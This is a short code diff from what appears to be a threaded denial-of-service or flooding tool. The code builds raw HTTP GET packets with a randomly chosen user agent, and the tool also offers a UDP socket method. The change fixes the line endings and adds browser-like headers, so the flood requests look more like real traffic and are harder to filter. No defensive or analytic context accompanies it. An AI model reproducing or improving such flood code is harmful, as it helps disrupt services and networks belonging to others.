@@ -456,7 +456,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		mesalready = False
 		if var.get_url == "":
 			var.get_url = var.ip
-		packet = ("GET /%s HTTP/1.1\nHost: %s\n\n User-Agent: %s\nConnection: Keep-Alive\n\n%s" % (var.get_url, var.ip, choice(var.user_agents), var.message)).encode("utf-8")
+		packet = ("GET /%s HTTP/1.1\r\nHost: %s\r\n User-Agent: %s\r\nConnection: Keep-Alive\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\n%s\r\n\r\n" % (var.get_url, var.ip, choice(var.user_agents), var.message)).encode("utf-8")
 		if not var.outtxtmute:
 			print("Thread started!")
 		if var.socketmethod == "UDP":
